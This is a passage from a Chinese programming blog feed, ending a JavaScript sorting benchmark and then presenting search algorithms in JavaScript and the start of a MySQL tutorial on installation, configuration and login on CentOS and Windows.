&#123;</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> [];</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> lesser = [];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> greater = [];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> pivot = list[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; list.length; i ++) &#123;</span></span><br><span class="line">          if (list[i] &lt; pivot) &#123;</span><br><span class="line">            lesser.push(list[i]);</span><br><span class="line"><span class="javascript">          &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">            greater.push(list[i]);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">this</span>.qSort(lesser).concat(pivot, <span class="keyword">this</span>.qSort(greater));</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> numElements = <span class="number">200000</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> myNums = <span class="keyword">new</span> CArray(numElements);</span></span><br><span class="line">    myNums.setData();</span><br><span class="line"><span class="javascript">    <span class="comment">// console.log(myNums.toString());</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> startTime = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span></span><br><span class="line"><span class="javascript">    <span class="comment">// myNums.insertionSort();// 27ms左右</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// myNums.bubbleSort();// 100ms左右</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// myNums.selectionSort();// 50ms左右</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// myNums.shellsort(); // 20ms左右</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// myNums.shellsort1(); // 8ms左右</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// myNums.mergeSort(); // 9ms左右</span></span></span><br><span class="line"><span class="javascript">    myNums.dataStore = myNums.qSort(myNums.dataStore); <span class="comment">// 17ms左右</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> endTime = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">'耗时: '</span> + (endTime - startTime) + <span class="string">'毫秒'</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// console.log(myNums.toString());</span></span></span><br><span class="line">    </span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="检索算法"><a href="#检索算法" class="headerlink" title="检索算法"></a>检索算法</h1><p>本章只介绍数据检索的一个方面：如何在列表中查找特定的值。有两种方式：顺序查找和二分查找。顺序查找适用于元素随机排列的列表；二分查找适用于元素已排序的列表。二分查找效率更高，但是你必须在进行查找之前花费额外的时间将列表中的元素排序。</p>
<h2 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h2><p>对于查找数据来说，最简单的方法就是从列表的第一个元素开始对列表元素逐个进行判断。这种方法称为顺序查找，有时也被称为线性查找。它属于暴力查找技巧的一种，在执行查找时可能会访问到数据结构里的所有元素。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">seqSearch</span>(<span class="params">arr, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] == data) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="查找最小值和最大值-1"><a href="#查找最小值和最大值-1" class="headerlink" title="查找最小值和最大值"></a>查找最小值和最大值</h2><p>首先看看如何在数组中查找最小值，算法如下</p>
<ol>
<li>将数组第一个元素赋值给一个变量，把这个变量作为最小值。</li>
<li>开始遍历数组，从第二个元素开始依次同当前最小值进行比较</li>
<li>如果当前元素数值小于当前最小值，则将当前元素设为新的最小值</li>
<li>移动到下一个元素，并且重复步骤3</li>
<li>当程序结束时，这个变量中存储的就是最小值<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findMin</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> min = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &lt; min) &#123;</span><br><span class="line">            min = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>查找最大值的思路类似<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findMax</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> max = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &gt; max) &#123;</span><br><span class="line">            max = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="使用自组织数据"><a href="#使用自组织数据" class="headerlink" title="使用自组织数据"></a>使用自组织数据</h2><p>对于未排序的数据集来说，当被查找的数据位于数据集的起始位置时，查找是最快的。通过将成功找到的元素置于数据集的起始位置，可以保证在以后的操作中该元素能被更快地查找到。这就是自组织数据：数据的位置并非由程序员在程序执行之前就组织好，而是在程序运行过程中由程序自动组织的。</p>
<p>我们可以很轻松地对seqSearch函数进行改动以加入自组织方式。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">seqSearch</span>(<span class="params">arr, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] == data) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                swap(arr,i,i<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">arr, index, index1</span>) </span>&#123;</span><br><span class="line">    temp = arr[index];</span><br><span class="line">    arr[index] = arr[index1];</span><br><span class="line">    arr[index1] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>使用这个方法后，查找最频繁的元素最终会移动到数据集的起始位置。<br>另外一种给seqSearch函数添加自组织数据的方法是：将找到的元素移动到数据集的起始位置，如果这个元素已经很接近起始位置，则不会对它的位置进行交换。我们参照“80-20原则”，仅当数据位于数据集的前20%元素之外时，该数据才需要被重新移动到数据集的起始位置。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">seqSearch</span>(<span class="params">arr, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] == data &amp;&amp; i &gt; (arr.length * <span class="number">0.2</span>)) &#123;</span><br><span class="line">            swap(arr,i,<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[i] == data) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="二分查找算法"><a href="#二分查找算法" class="headerlink" title="二分查找算法"></a>二分查找算法</h2><p>这个算法只对有序的数据集有效。算法描述如下</p>
<ol>
<li>将数组的第一个位置设置为下边界(0).</li>
<li>将数组最后一个元素所在的位置设置为上边界(数组的长度减1).</li>
<li>若下边界等于或小于上边界，则做如下操作<br>a.将中点设置为（上边界加上下边界）除以2<br>b.如果中点的元素小于查询的值，则将下边界设置为中点元素所在下标加1<br>c.如果中点的元素大于查询的值，则将上边界设置为中点元素所在下标减1<br>d.否则中点元素即为要查找的数据，可以进行返回。<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binSearch</span>(<span class="params">arr, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> upperBound = arr.length<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">var</span> lowerBound = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (lowerBound &lt;= upperBound) &#123;</span><br><span class="line">        <span class="keyword">var</span> mid = <span class="built_in">Math</span>.floor((upperBound + lowerBound) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] &lt; data) &#123;</span><br><span class="line">            lowerBound = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &gt; data) &#123;</span><br><span class="line">            upperBound = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="计算重复次数"><a href="#计算重复次数" class="headerlink" title="计算重复次数"></a>计算重复次数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params">arr, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> position = binSearch(arr, data);</span><br><span class="line">    <span class="keyword">if</span> (position &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = position - <span class="number">1</span>; i &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[i] == data) &#123;</span><br><span class="line">                ++count;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = position+<span class="number">1</span>; i &lt; arr.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[i] == data) &#123;</span><br><span class="line">                ++count;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="查找文本数据"><a href="#查找文本数据" class="headerlink" title="查找文本数据"></a>查找文本数据</h2><p>很显然顺序查找也适用于查找文本<br>二分法查找，需要先对文本排序<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertionsort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp, inner;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> outer = <span class="number">1</span>; outer &lt;= arr.length<span class="number">-1</span>; ++outer) &#123;</span><br><span class="line">        temp = arr[outer];</span><br><span class="line">        inner = outer;</span><br><span class="line">        <span class="keyword">while</span> (inner &gt; <span class="number">0</span> &amp;&amp; (arr[inner<span class="number">-1</span>] &gt;= temp)) &#123;</span><br><span class="line">            arr[inner] = arr[inner<span class="number">-1</span>];</span><br><span class="line">            --inner;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[inner] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql基础教程</title>
    <url>/2019/05/12/mysql%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>本文引用自<a href="https://www.runoob.com/mysql/mysql-operator.html" target="_blank" rel="noopener">MySQL 教程 | 菜鸟教程</a></p>
<h1 id="mysql教程"><a href="#mysql教程" class="headerlink" title="mysql教程"></a>mysql教程</h1><p>MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。</p>
<p>在本教程中，会让大家快速掌握 MySQL 的基本知识，并轻松使用 MySQL 数据库。<br><a id="more"></a></p>
<h2 id="什么是数据库？"><a href="#什么是数据库？" class="headerlink" title="什么是数据库？"></a>什么是数据库？</h2><p>数据库（Database）是按照数据结构来组织、存储和管理数据的仓库。<br>每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。<br>我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。<br>所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理的大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。<br>RDBMS 即关系数据库管理系统(Relational Database Management System)的特点：</p>
<p>1.数据以表格的形式出现<br>2.每行为各种记录名称<br>3.每列为记录名称所对应的数据域<br>4.许多的行和列组成一张表单<br>5.若干的表单组成database</p>
<h2 id="RDBMS-术语"><a href="#RDBMS-术语" class="headerlink" title="RDBMS 术语"></a>RDBMS 术语</h2><p>在我们开始学习MySQL 数据库前，让我们先了解下RDBMS的一些术语：</p>
<p>1.数据库: 数据库是一些关联表的集合。<br>2.数据表: 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。<br>3.列: 一列(数据元素) 包含了相同的数据, 例如邮政编码的数据。<br>4.行：一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。<br>5.冗余：存储两倍数据，冗余降低了性能，但提高了数据的安全性。<br>6.主键：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。<br>7.外键：外键用于关联两个表。<br>8.复合键：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。<br>9.索引：使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。<br>10.参照完整性: 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性。</p>
<p>MySQL 为关系型数据库(Relational Database Management System), 这种所谓的”关系型”可以理解为”表格”的概念, 一个关系型数据库由一个或数个表格组成, 如图所示的一个表格:<br><img src="https://mfaying.github.io/images/mysql/1.jpg" alt="avatar"><br>1.表头(header): 每一列的名称;<br>2.列(col): 具有相同数据类型的数据的集合;<br>3.行(row): 每一行用来描述某条记录的具体信息;<br>4.值(value): 行的具体信息, 每个值必须与该列的数据类型相同;<br>5.键(key): 键的值在当前列中具有唯一性。</p>
<h2 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h2><p>MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p>
<p>1.MySQL 是开源的，所以你不需要支付额外的费用。<br>2.MySQL 支持大型的数据库。可以处理拥有上千万条记录的大型数据库。<br>3.MySQL 使用标准的 SQL 数据语言形式。<br>4.MySQL 可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。<br>5.MySQL 对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言。<br>6.MySQL 支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。<br>7.MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。</p>
<h1 id="MySQL-安装"><a href="#MySQL-安装" class="headerlink" title="MySQL 安装"></a>MySQL 安装</h1><p>所有平台的 MySQL 下载地址为： MySQL 下载(<a href="https://dev.mysql.com/downloads/mysql/" target="_blank" rel="noopener">https://dev.mysql.com/downloads/mysql/</a>) 。 挑选你需要的 MySQL Community Server 版本及对应的平台。</p>
<p>注意：安装过程我们需要通过开启管理员权限来安装，否则会由于权限不足导致无法安装</p>
<h2 id="Linux-UNIX-上安装-MySQL"><a href="#Linux-UNIX-上安装-MySQL" class="headerlink" title="Linux/UNIX 上安装 MySQL"></a>Linux/UNIX 上安装 MySQL</h2><p>Linux平台上推荐使用RPM包来安装Mysql,MySQL AB提供了以下RPM包的下载地址：</p>
<p>1.MySQL - MySQL服务器。你需要该选项，除非你只想连接运行在另一台机器上的MySQL服务器。<br>2.MySQL-client - MySQL 客户端程序，用于连接并操作Mysql服务器。<br>3.MySQL-devel - 库和包含文件，如果你想要编译其它MySQL客户端，例如Perl模块，则需要安装该RPM包。<br>4.MySQL-shared - 该软件包包含某些语言和应用程序需要动态装载的共享库(libmysqlclient.so*)，使用MySQL。<br>5.MySQL-bench - MySQL数据库服务器的基准和性能测试工具。</p>
<p>安装前，我们可以检测系统是否自带安装 MySQL:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep mysql</span><br></pre></td></tr></table></figure></p>
<p>如果你系统有安装，那可以选择进行卸载:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -e mysql　　// 普通删除模式</span><br><span class="line">rpm -e --nodeps mysql　　// 强力删除模式，如果使用上面命令删除时，提示有依赖的其它文件，则用该命令可以对其进行强力删除</span><br></pre></td></tr></table></figure></p>
<p>安装 MySQL：<br>接下来我们在 Centos7 系统下使用 yum 命令安装 MySQL，需要注意的是 CentOS 7 版本中 MySQL数据库已从默认的程序列表中移除，所以在安装前我们需要先去官网下载 Yum 资源包，下载地址为：<a href="https://dev.mysql.com/downloads/repo/yum/" target="_blank" rel="noopener">https://dev.mysql.com/downloads/repo/yum/</a><br><img src="https://mfaying.github.io/images/mysql/2.jpg" alt="avatar"><br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm</span><br><span class="line">rpm -ivh mysql-community-release-el7-5.noarch.rpm</span><br><span class="line">yum update</span><br><span class="line">yum install mysql-server</span><br></pre></td></tr></table></figure></p>
<p>权限设置：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chown mysql:mysql -R /var/lib/mysql</span><br></pre></td></tr></table></figure></p>
<p>初始化 MySQL：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqld --initialize</span><br></pre></td></tr></table></figure></p>
<p>启动 MySQL：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start mysqld</span><br></pre></td></tr></table></figure></p>
<p>查看 MySQL 运行状态：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl status mysqld</span><br></pre></td></tr></table></figure></p>
<p>注意：如果我们是第一次启动 mysql 服务，mysql 服务器首先会进行初始化的配置。</p>
<p>此外,你也可以使用 MariaDB 代替，MariaDB 数据库管理系统是 MySQL 的一个分支，主要由开源社区在维护，采用 GPL 授权许可。开发这个分支的原因之一是：甲骨文公司收购了 MySQL 后，有将 MySQL 闭源的潜在风险，因此社区采用分支的方式来避开这个风险。</p>
<p>MariaDB的目的是完全兼容MySQL，包括API和命令行，使之能轻松成为MySQL的代替品。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install mariadb-server mariadb</span><br></pre></td></tr></table></figure></p>
<p>mariadb数据库的相关命令是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start mariadb  #启动MariaDB</span><br><span class="line">systemctl stop mariadb  #停止MariaDB</span><br><span class="line">systemctl restart mariadb  #重启MariaDB</span><br><span class="line">systemctl enable mariadb  #设置开机启动</span><br></pre></td></tr></table></figure></p>
<h2 id="验证-MySQL-安装"><a href="#验证-MySQL-安装" class="headerlink" title="验证 MySQL 安装"></a>验证 MySQL 安装</h2><p>在成功安装 MySQL 后，一些基础表会表初始化，在服务器启动后，你可以通过简单的测试来验证 MySQL 是否工作正常。</p>
<p>使用 mysqladmin 工具来获取服务器状态：</p>
<p>使用 mysqladmin 命令俩检查服务器的版本, 在 linux 上该二进制文件位于 /usr/bin 目录，在 Windows 上该二进制文件位于C:\mysql\bin 。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@host]# mysqladmin --version</span><br></pre></td></tr></table></figure></p>
<p>linux上该命令将输出以下结果，该结果基于你的系统信息：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqladmin  Ver 8.23 Distrib 5.0.9-0, for redhat-linux-gnu on i386</span><br></pre></td></tr></table></figure></p>
<p>如果以上命令执行后未输出任何信息，说明你的Mysql未安装成功。</p>
<h2 id="使用-MySQL-Client-Mysql客户端-执行简单的SQL命令"><a href="#使用-MySQL-Client-Mysql客户端-执行简单的SQL命令" class="headerlink" title="使用 MySQL Client(Mysql客户端) 执行简单的SQL命令"></a>使用 MySQL Client(Mysql客户端) 执行简单的SQL命令</h2><p>你可以在 MySQL Client(Mysql客户端) 使用 mysql 命令连接到 MySQL 服务器上，默认情况下 MySQL 服务器的登录密码为空，所以本实例不需要输入密码。</p>
<p>命令如下：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@host]<span class="comment"># mysql</span></span><br></pre></td></tr></table></figure></p>
<p>以上命令执行后会输出 mysql&gt;提示符，这说明你已经成功连接到Mysql服务器上，你可以在 mysql&gt; 提示符执行SQL命令：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW DATABASES;</span><br><span class="line">+----------+</span><br><span class="line">| Database |</span><br><span class="line">+----------+</span><br><span class="line">| mysql    |</span><br><span class="line">| <span class="built_in">test</span>     |</span><br><span class="line">+----------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.13 sec)</span><br></pre></td></tr></table></figure></p>
<h2 id="Mysql安装后需要做的"><a href="#Mysql安装后需要做的" class="headerlink" title="Mysql安装后需要做的"></a>Mysql安装后需要做的</h2><p>Mysql安装成功后，默认的root用户密码为空，你可以使用以下命令来创建root用户的密码：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@host]<span class="comment"># mysqladmin -u root password "new_password";</span></span><br></pre></td></tr></table></figure></p>
<p>现在你可以通过以下命令来连接到Mysql服务器：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[root@host]<span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter password:*******</span><br></pre></td></tr></table></figure></p>
<p>注意：在输入密码时，密码是不会显示了，你正确输入即可。</p>
<h2 id="Windows-上安装-MySQL"><a href="#Windows-上安装-MySQL" class="headerlink" title="Windows 上安装 MySQL"></a>Windows 上安装 MySQL</h2><p>Windows 上安装 MySQL 相对来说会较为简单，地那就链接 <a href="https://cdn.mysql.com//Downloads/MySQL-8.0/mysql-8.0.11-winx64.zip" target="_blank" rel="noopener">https://cdn.mysql.com//Downloads/MySQL-8.0/mysql-8.0.11-winx64.zip</a> 下载 zip 包。</p>
<p>最新版本可以在 MySQL 下载 中下载中查看。<br><img src="https://mfaying.github.io/images/mysql/3.jpg" alt="avatar"><br>下载完后，我们将 zip 包解压到相应的目录，这里我将解压后的文件夹放在 C:\web\mysql-8.0.11 下。<br>接下来我们需要配置下 MySQL 的配置文件<br>打开刚刚解压的文件夹 C:\web\mysql-8.0.11 ，在该文件夹下创建 my.ini 配置文件，编辑 my.ini 配置以下基本信息：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[mysql]</span><br><span class="line"><span class="comment"># 设置mysql客户端默认字符集</span></span><br><span class="line">default-character-set=utf8</span><br><span class="line"> </span><br><span class="line">[mysqld]</span><br><span class="line"><span class="comment"># 设置3306端口</span></span><br><span class="line">port = 3306</span><br><span class="line"><span class="comment"># 设置mysql的安装目录</span></span><br><span class="line">basedir=C:\\web\\mysql-8.0.11</span><br><span class="line"><span class="comment"># 设置 mysql数据库的数据的存放目录，MySQL 8+ 不需要以下配置，系统自己生成即可，否则有可能报错</span></span><br><span class="line"><span class="comment"># datadir=C:\\web\\sqldata</span></span><br><span class="line"><span class="comment"># 允许最大连接数</span></span><br><span class="line">max_connections=20</span><br><span class="line"><span class="comment"># 服务端使用的字符集默认为8比特编码的latin1字符集</span></span><br><span class="line">character-set-server=utf8</span><br><span class="line"><span class="comment"># 创建新表时将使用的默认存储引擎</span></span><br><span class="line">default-storage-engine=INNODB</span><br></pre></td></tr></table></figure></p>
<p>接下来我们来启动下 MySQL 数据库：<br>以管理员身份打开 cmd 命令行工具，切换目录：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd C:\web\mysql-8.0.11\bin</span><br></pre></td></tr></table></figure></p>
<p>初始化数据库：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqld --initialize --console</span><br></pre></td></tr></table></figure></p>
<p>执行完成后，会输出 root 用户的初始默认密码，如：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">2018-04-20T02:35:05.464644Z 5 [Note] [MY-010454] [Server] A temporary password is generated <span class="keyword">for</span> root@localhost: APWCY5ws&amp;hjQ</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>APWCY5ws&amp;hjQ 就是初始密码，后续登录需要用到，你也可以在登陆后修改密码。<br>输入以下安装命令：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysqld install</span><br></pre></td></tr></table></figure></p>
<p>启动输入以下命令即可：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure></p>
<p>注意: 在 5.7 需要初始化 data 目录：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\web\mysql-8.0.11\bin </span><br><span class="line">mysqld --initialize-insecure</span><br></pre></td></tr></table></figure></p>
<p>初始化后再运行 net start mysql 即可启动 mysql。</p>
<h2 id="登录-MySQL"><a href="#登录-MySQL" class="headerlink" title="登录 MySQL"></a>登录 MySQL</h2><p>当 MySQL 服务已经运行时, 我们可以通过 MySQL 自带的客户端工具登录到 MySQL 数据库中, 首先打开命令提示符, 输入以下格式的命名:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql -h 主机名 -u 用户名 -p</span><br></pre></td></tr></table></figure></p>
<p>参数说明：</p>
<p>-h : 指定客户端所要登录的 MySQL 主机名, 登录本机(localhost 或 127.0.0.1)该参数可以省略;<br>-u : 登录的用户名;<br>-p : 告诉服务器将会使用一个密码来登录, 如果所要登录的用户名密码为空, 可以忽略此选项。</p>
<p>如果我们要登录本机的 MySQL 数据库，只需要输入以下命令即可：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></p>
<p>按回车确认, 如果安装正确且 MySQL 正在运行, 会得到以下响应:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Enter password:</span><br></pre></td></tr></table></figure></p>
<p>若密码存在, 输入密码登录, 不存在则直接按回车登录。登录成功后你将会看到 Welcome to the MySQL monitor… 的提示语。</p>
<p>然后命令提示符会一直以 mysq&gt; 加一个闪烁的光标等待命令的输入, 输入 exit 或 quit 退出登录。</p>
<h1 id="MySQL-管理"><a href="#MySQL-管理" class="headerlink" title="MySQL 管理"></a>MySQL 管理</h1><h2 id="启动及关闭-MySQL-服务器"><a href="#启动及关闭-MySQL-服务器" class="headerlink" title="启动及关闭 MySQL 服务器"></a>启动及关闭 MySQL 服务器</h2><p>Windows 系统下<br>在 Windows 系统下，打开命令窗口(cmd)，进入 MySQL 安装目录的 bin 目录。</p>
<p>启动：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:/mysql/bin</span><br><span class="line">mysqld --console</span><br></pre></td></tr></table></figure></p>
<p>关闭：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:/mysql/bin</span><br><span class="line">mysqladmin -uroot shutdown</span><br></pre></td></tr></table></figure></p>
